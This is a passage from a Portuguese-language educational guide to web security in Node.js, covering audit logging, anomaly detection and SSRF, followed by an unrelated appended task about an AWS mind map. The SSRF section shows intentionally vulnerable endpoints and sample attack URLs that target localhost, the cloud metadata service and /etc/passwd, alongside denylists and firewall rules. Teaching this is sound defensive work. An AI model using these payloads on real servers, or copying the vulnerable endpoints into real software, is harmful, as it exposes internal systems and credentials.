      // ✅ Log de tentativa não autorizada
      logger.warn('Unauthorized access attempt', {
        action: 'delete_user',
        actorUserId: actorUserId,
        targetUserId: targetUserId,
        ip: req.ip,
        requestId: req.id
      });
      
      return res.status(403).json({ error: 'Sem permissão' });
    }
    
    const user = await database.getUser(targetUserId);
    
    // ✅ Log completo antes de deletar
    auditLog('user_deleted', {
      actorUserId: actorUserId,
      targetUserId: targetUserId,
      targetUsername: user.username,
      ip: req.ip,
      userAgent: req.get('user-agent'),
      requestId: req.id
    });
    
    await database.deleteUser(targetUserId);
    
    res.json({ deleted: true });
    
  } catch (error) {
    // ✅ Log de erro com contexto
    logger.error('Error deleting user', {
      error: error.message,
      stack: error.stack,
      actorUserId: actorUserId,
      targetUserId: targetUserId,
      requestId: req.id
    });
    
    res.status(500).json({ error: 'Erro ao deletar usuário' });
  }
});

// Solução 5: Monitoramento de anomalias
class AnomalyDetector {
  constructor() {
    this.userActions = new Map();
  }
  
  recordAction(userId, action) {
    if (!this.userActions.has(userId)) {
      this.userActions.set(userId, []);
    }
    
    const actions = this.userActions.get(userId);
    actions.push({
      action: action,
      timestamp: Date.now()
    });
    
    // Mantém apenas últimos 100 actions
    if (actions.length > 100) {
      actions.shift();
    }
    
    // ✅ Detecta padrões anormais
    this.detectAnomalies(userId, actions);
  }
  
  detectAnomalies(userId, actions) {
    const recentWindow = 60000; // 1 minuto
    const now = Date.now();
    
    const recentActions = actions.filter(
      a => now - a.timestamp < recentWindow
    );
    
    // ✅ Alerta se muitas ações em curto período
    if (recentActions.length > 50) {
      logger.warn('Unusual activity detected', {
        userId: userId,
        actionsCount: recentActions.length,
        timeWindow: '1 minute',
        actionTypes: [...new Set(recentActions.map(a => a.action))]
      });
      
      sendSecurityAlert('Unusual activity', { 
        userId, 
        actionsCount: recentActions.length 
      });
    }
    
    // ✅ Detecta sequências suspeitas
    const lastFive = recentActions.slice(-5);
    const allSame = lastFive.every(a => a.action === lastFive[0].action);
    
    if (allSame && lastFive.length === 5) {
      logger.warn('Repetitive action pattern detected', {
        userId: userId,
        action: lastFive[0].action,
        count: 5
      });
    }
  }
}

const anomalyDetector = new AnomalyDetector();

// Middleware para rastrear ações
app.use(authenticateToken);
app.use((req, res, next) => {
  if (req.user) {
    anomalyDetector.recordAction(req.user.id, req.path);
  }
  next();
});

// Solução 6: Dashboard de monitoramento em tempo real
// Usando Socket.io para alertas em tempo real
const http = require('http');
const server = http.createServer(app);
const { Server } = require('socket.io');
const io = new Server(server);

// Emite eventos de segurança para dashboard
function sendSecurityEvent(event) {
  io.to('security-room').emit('security-event', event);
}

// Endpoint para dashboard de segurança
app.get('/security/dashboard', requireAdmin, (req, res) => {
  res.sendFile(__dirname + '/dashboard.html');
});

io.on('connection', (socket) => {
  socket.join('security-room');
  
  // Envia estatísticas atuais
  socket.emit('stats', {
    activeUsers: sessions.size,
    failedLogins: loginAttempts.size,
    alerts: getRecentAlerts()
  });
});

// Solução 7: Integração com sistemas de alertas
async function sendSecurityAlert(type, details) {
  const alert = {
    type: type,
    details: details,
    timestamp: new Date().toISOString(),
    severity: determineSeverity(type)
  };
  
  // ✅ Log do alerta
  logger.error('Security alert', alert);
  
  // ✅ Envia para dashboard em tempo real
  sendSecurityEvent(alert);
  
  // ✅ Envia email para admins
  if (alert.severity === 'high' || alert.severity === 'critical') {
    await sendEmailToAdmins('Security Alert', JSON.stringify(alert, null, 2));
  }
  
  // ✅ Integra com Slack/Discord
  await sendToSlack(alert);
  
  // ✅ Registra em sistema de tickets
  await createSecurityTicket(alert);
}

function determineSeverity(type) {
  const severityMap = {
    'brute_force_attack': 'high',
    'unauthorized_access': 'high',
    'unusual_activity': 'medium',
    'new_login_location': 'low'
  };
  
  return severityMap[type] || 'medium';
}

// Solução 8: Rotação e backup de logs
const schedule = require('node-schedule');

// ✅ Rotaciona logs diariamente
schedule.scheduleJob('0 0 * * *', async () => {
  logger.info('Starting log rotation');
  
  const date = new Date().toISOString().split('T')[0];
  
  // Arquiva logs antigos
  await archiveLogs(date);
  
  // Limpa logs muito antigos (>90 dias)
  await cleanOldLogs(90);
  
  logger.info('Log rotation completed');
});

async function archiveLogs(date) {
  const fs = require('fs').promises;
  const zlib = require('zlib');
  const { promisify } = require('util');
  const gzip = promisify(zlib.gzip);
  
  const logFiles = ['combined.log', 'error.log', 'security.log'];
  
  for (const file of logFiles) {
    const path = `logs/${file}`;
    const archivePath = `logs/archive/${file}.${date}.gz`;
    
    // Lê e comprime
    const content = await fs.readFile(path);
    const compressed = await gzip(content);
    
    // Salva arquivo comprimido
    await fs.writeFile(archivePath, compressed);
    
    // Limpa arquivo original
    await fs.writeFile(path, '');
  }
}
```

### 🛡️ Como Prevenir

1. **Logue todos os eventos críticos**: Login, mudanças de permissão, exclusões
2. **Use logging estruturado**: JSON format para facilitar análise
3. **Não logue dados sensíveis**: Senhas, tokens, PII
4. **Implemente alertas**: Notificações em tempo real
5. **Monitore anomalias**: Padrões incomuns de uso
6. **Retenha logs adequadamente**: Pelo menos 90 dias
7. **Proteja os logs**: Não devem ser editáveis
8. **Integre SIEM**: Security Information and Event Management

---

## 10. Server-Side Request Forgery (SSRF)

### 🎭 Explicação Lúdica

SSRF é como dar a um estranho o telefone interno da sua empresa e deixá-lo fazer ligações se passando por você. Ele pode ligar para sistemas internos que confiam em você, acessar serviços privados, ou até mesmo fazer pedidos para a internet usando sua identidade. É o atacante usando seu servidor como um proxy mal-intencionado!

### 🎯 O que é?

Server-Side Request Forgery (SSRF) ocorre quando uma aplicação web busca um recurso remoto sem validar a URL fornecida pelo usuário. Isso permite que um atacante force a aplicação a enviar requisições para destinos não esperados, mesmo que protegidos por firewall.

### ❌ Exemplo Vulnerável

```javascript
// Código VULNERÁVEL - SSRF
const express = require('express');
const axios = require('axios');
const app = express();

// ERRO 1: Aceita qualquer URL do usuário
app.get('/fetch-image', async (req, res) => {
  const imageUrl = req.query.url;
  
  try {
    // ❌ Busca qualquer URL sem validação
    const response = await axios.get(imageUrl);
    
    res.send(response.data);
    
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Ataques possíveis:
// /fetch-image?url=http://localhost:8080/admin
// /fetch-image?url=http://169.254.169.254/latest/meta-data/
// /fetch-image?url=file:///etc/passwd

// ERRO 2: Webhook sem validação
app.post('/webhook', async (req, res) => {
  const callbackUrl = req.body.callback;
  
  // ❌ Faz requisição para URL fornecida pelo usuário
  await axios.post(callbackUrl, {
    event: 'completed',
    data: sensitiveData
  });
  
  res.json({ success: true });
});

// ERRO 3: Proxy aberto
app.get('/proxy', async (req, res) => {
  const targetUrl = req.query.target;
  
  // ❌ Atua como proxy sem restrições
  const response = await axios.get(targetUrl, {
    headers: req.headers // Passa headers originais
  });
  
  res.send(response.data);
});
```

### ✅ Solução Segura

```javascript
// Código SEGURO - Prevenção de SSRF
const express = require('express');
const axios = require('axios');
const { URL } = require('url');
const dns = require('dns').promises;
const app = express();

// Solução 1: Lista de domínios permitidos (Allowlist)
const ALLOWED_DOMAINS = [
  'api.example.com',
  'images.example.com',
  'cdn.example.com'
];

// Solução 2: Lista de IPs/ranges bloqueados (Denylist)
const BLOCKED_IP_RANGES = [
  // Localhost
  /^127\./,
  /^::1$/,
  /^0\.0\.0\.0$/,
  
  // Private networks (RFC 1918)
  /^10\./,
  /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
  /^192\.168\./,
  
  // Link-local
  /^169\.254\./,
  /^fe80:/,
  
  // Loopback
  /^::ffff:127\./,
  
  // AWS metadata
  /^169\.254\.169\.254$/
];

// Função para validar URL
async function validateUrl(urlString) {
  try {
    // ✅ Parse da URL
    const url = new URL(urlString);
    
    // ✅ 1. Valida protocolo (apenas HTTP/HTTPS)
    if (!['http:', 'https:'].includes(url.protocol)) {
      throw new Error('Protocolo não permitido');
    }
    
    // ✅ 2. Valida domínio está na allowlist
    if (!ALLOWED_DOMAINS.includes(url.hostname)) {
      throw new Error('Domínio não autorizado');
    }
    
    // ✅ 3. Resolve DNS para verificar IP
    const addresses = await dns.resolve4(url.hostname);
    
    // ✅ 4. Verifica se algum IP está bloqueado
    for (const ip of addresses) {
      for (const blockedRange of BLOCKED_IP_RANGES) {
        if (blockedRange.test(ip)) {
          throw new Error('Endereço IP bloqueado');
        }
      }
    }
    
    // ✅ 5. Verifica se não há redirecionamento para IPs privados
    // Isso será feito na requisição
    
    return { valid: true, url };
    
  } catch (error) {
    return { 
      valid: false, 
      error: error.message 
    };
  }
}

// Endpoint seguro para buscar imagens
app.get('/fetch-image', async (req, res) => {
  const imageUrl = req.query.url;
  
  if (!imageUrl) {
    return res.status(400).json({ error: 'URL não fornecida' });
  }
  
  // ✅ Valida URL
  const validation = await validateUrl(imageUrl);
  
  if (!validation.valid) {
    return res.status(400).json({ 
      error: 'URL inválida',
      details: validation.error
    });
  }
  
  try {
    // ✅ Configuração segura do axios
    const response = await axios.get(validation.url.href, {
      // ✅ Timeout para evitar DoS
      timeout: 5000,
      
      // ✅ Limite de tamanho
      maxContentLength: 5 * 1024 * 1024, // 5MB
      
      // ✅ Não segue redirects automaticamente
      maxRedirects: 0,
      
      // ✅ Valida certificado SSL
      httpsAgent: new (require('https').Agent)({
        rejectUnauthorized: true
      }),
      
      // ✅ Headers seguros (remove headers sensíveis)
      headers: {
        'User-Agent': 'MyApp/1.0',
        'Accept': 'image/*'
      },
      
      // ✅ Valida response antes de processar
      validateStatus: function (status) {
        return status >= 200 && status < 300;
      }
    });
    
    // ✅ Valida content-type
    const contentType = response.headers['content-type'];
    if (!contentType || !contentType.startsWith('image/')) {
      return res.status(400).json({ 
        error: 'Conteúdo não é uma imagem' 
      });
    }
    
    // ✅ Loga acesso
    logger.info('Image fetched', {
      url: imageUrl,
      size: response.data.length,
      userId: req.user?.id,
      ip: req.ip
    });
    
    res.type(contentType).send(response.data);
    
  } catch (error) {
    logger.warn('Failed to fetch image', {
      url: imageUrl,
      error: error.message,
      userId: req.user?.id,
      ip: req.ip
    });
    
    res.status(500).json({ error: 'Erro ao buscar imagem' });
  }
});

// Solução 3: Validação avançada com DNS rebinding protection
class SSRFProtection {
  constructor() {
    this.dnsCache = new Map();
    this.cacheTTL = 300000; // 5 minutos
  }
  
  async resolveAndValidate(hostname) {
    // ✅ Verifica cache primeiro
    const cached = this.dnsCache.get(hostname);
    if (cached && Date.now() - cached.timestamp < this.cacheTTL) {
      return cached.ips;
    }
    
    // ✅ Resolve DNS
    const ips = await dns.resolve4(hostname);
    
    // ✅ Valida cada IP
    for (const ip of ips) {
      if (this.isPrivateIP(ip)) {
        throw new Error(`IP privado detectado: ${ip}`);
      }
    }
    
    // ✅ Armazena em cache
    this.dnsCache.set(hostname, {
      ips: ips,
      timestamp: Date.now()
    });
    
    return ips;
  }
  
  isPrivateIP(ip) {
    const parts = ip.split('.').map(Number);
    
    // 127.0.0.0/8
    if (parts[0] === 127) return true;
    
    // 10.0.0.0/8
    if (parts[0] === 10) return true;
    
    // 172.16.0.0/12
    if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
    
    // 192.168.0.0/16
    if (parts[0] === 192 && parts[1] === 168) return true;
    
    // 169.254.0.0/16 (link-local)
    if (parts[0] === 169 && parts[1] === 254) return true;
    
    // 0.0.0.0/8
    if (parts[0] === 0) return true;
    
    return false;
  }
  
  // ✅ Previne DNS rebinding
  async validateTwice(hostname) {
    const ips1 = await this.resolveAndValidate(hostname);
    
    // Aguarda um pouco
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    const ips2 = await this.resolveAndValidate(hostname);
    
    // ✅ Verifica se IPs mudaram (possível DNS rebinding)
    if (JSON.stringify(ips1.sort()) !== JSON.stringify(ips2.sort())) {
      throw new Error('DNS rebinding detectado');
    }
    
    return ips2;
  }
}

const ssrfProtection = new SSRFProtection();

// Solução 4: Webhook com validação estrita
app.post('/webhook', authenticateToken, async (req, res) => {
  const callbackUrl = req.body.callback;
  
  try {
    // ✅ Valida URL
    const validation = await validateUrl(callbackUrl);
    
    if (!validation.valid) {
      return res.status(400).json({ 
        error: 'Callback URL inválida',
        details: validation.error
      });
    }
    
    // ✅ Proteção adicional contra DNS rebinding
    await ssrfProtection.validateTwice(validation.url.hostname);
    
    // ✅ Dados não sensíveis apenas
    const safeData = {
      event: 'completed',
      timestamp: new Date().toISOString(),
      // Não envia dados sensíveis
    };
    
    await axios.post(validation.url.href, safeData, {
      timeout: 3000,
      maxRedirects: 0
    });
    
    res.json({ success: true });
    
  } catch (error) {
    logger.error('Webhook error', {
      url: callbackUrl,
      error: error.message,
      userId: req.user.id
    });
    
    res.status(500).json({ error: 'Erro ao enviar webhook' });
  }
});

// Solução 5: Proxy restrito
const ALLOWED_PROXY_TARGETS = [
  'https://api.example.com',
  'https://external-service.com'
];

app.get('/proxy', authenticateToken, async (req, res) => {
  const targetUrl = req.query.target;
  
  // ✅ Apenas URLs específicas permitidas
  if (!ALLOWED_PROXY_TARGETS.includes(targetUrl)) {
    return res.status(403).json({ 
      error: 'Target não autorizado',
      allowedTargets: ALLOWED_PROXY_TARGETS
    });
  }
  
  try {
    const response = await axios.get(targetUrl, {
      timeout: 5000,
      maxRedirects: 0,
      
      // ✅ Não passa headers do cliente
      headers: {
        'User-Agent': 'MyApp-Proxy/1.0'
      }
    });
    
    // ✅ Remove headers sensíveis antes de retornar
    delete response.headers['set-cookie'];
    delete response.headers['authorization'];
    
    res.set(response.headers);
    res.send(response.data);
    
  } catch (error) {
    res.status(500).json({ error: 'Erro no proxy' });
  }
});

// Solução 6: Network segmentation
/*
Configuração do firewall (iptables):

# Bloqueia acesso do servidor web a rede interna
iptables -A OUTPUT -p tcp -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -p tcp -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -p tcp -d 192.168.0.0/16 -j DROP

# Bloqueia acesso a metadata services
iptables -A OUTPUT -p tcp -d 169.254.169.254 -j DROP

# Permite apenas IPs específicos
iptables -A OUTPUT -p tcp -d 1.2.3.4 -j ACCEPT
*/

// Solução 7: Rate limiting para SSRF
const ssrfLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minuto
  max: 10, // 10 requisições por minuto
  message: 'Muitas requisições de URL externa'
});

app.use('/fetch-image', ssrfLimiter);
app.use('/webhook', ssrfLimiter);
app.use('/proxy', ssrfLimiter);
```

### 🛡️ Como Prevenir

1. **Sanitize user input**: Valide e filtre todas as URLs
2. **Allowlist de domínios**: Apenas domínios específicos permitidos
3. **Denylist de IPs**: Bloqueie IPs privados e localhost
4. **Desabilite redirects**: Ou valide destino do redirect
5. **Validação de response**: Verifique content-type e tamanho
6. **Network segmentation**: Isole servidores web de redes internas
7. **DNS validation**: Resolva e valide IPs antes de fazer request
8. **Rate limiting**: Limite quantidade de requests externos

---

## 📋 Resumo Geral

### Ordem de Prioridade OWASP Top 10 (2021)

1. **A01 - Broken Access Control**: Falhas em verificações de autorização
2. **A02 - Cryptographic Failures**: Exposição de dados sensíveis
3. **A03 - Injection**: SQL, NoSQL, XSS, Command Injection
4. **A04 - Insecure Design**: Falhas no design arquitetural
5. **A05 - Security Misconfiguration**: Configurações incorretas
6. **A06 - Vulnerable Components**: Dependências desatualizadas
7. **A07 - Authentication Failures**: Falhas de autenticação
8. **A08 - Software Integrity Failures**: Código e dados não verificados
9. **A09 - Logging Failures**: Logs e monitoramento inadequados
10. **A10 - SSRF**: Requisições forjadas do servidor

### Boas Práticas Gerais

- ✅ **Valide todos os inputs**: Nunca confie em dados do usuário
- ✅ **Use bibliotecas atualizadas**: Mantenha dependências seguras
- ✅ **Implemente autenticação forte**: MFA, senhas fortes, tokens JWT
- ✅ **Criptografe dados sensíveis**: Em repouso e em trânsito
- ✅ **Logue eventos de segurança**: Para detecção e resposta a incidentes
- ✅ **Teste regularmente**: Auditorias de segurança e pentests
- ✅ **Educação contínua**: Mantenha equipe atualizada sobre ameaças
- ✅ **Defense in Depth**: Múltiplas camadas de segurança

### Ferramentas Recomendadas

**Análise de Código:**
- ESLint com plugins de segurança
- Snyk
- npm audit
- OWASP Dependency Check

**Testing:**
- OWASP ZAP
- Burp Suite
- Postman (com testes de segurança)

**Monitoring:**
- Winston (logging)
- Prometheus + Grafana (métricas)
- Sentry (error tracking)
- ELK Stack (logs centralizados)

**Proteção:**
- Helmet.js (headers de segurança)
- express-rate-limit (rate limiting)
- csurf (proteção CSRF)
- express-validator (validação de inputs)

---

## 🔗 Referências

- [OWASP Top 10 - 2021](https://owasp.org/Top10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)

---

**Autor**: Documentação criada para fins educacionais  
**Data**: Novembro 2025  
**Versão**: 1.0

*Esta documentação é um guia completo sobre as principais vulnerabilidades de segurança em aplicações web, com foco em JavaScript/Node.js. Use-a como referência para desenvolver aplicações mais seguras e proteger seus usuários.*






# Tarefa:
Criar um mapa mental sobre os serviços cloud aws ( **S3, CloudFront e ECD** )

## Critérios do mapa mental
- O que é o serviço, explicação breve.
- O que ele soluciona.
- Custos
- Vantagem
- Desvantagem
- Exemplo de utilização
- Comandos CLI
	- código.
	- o que ele faz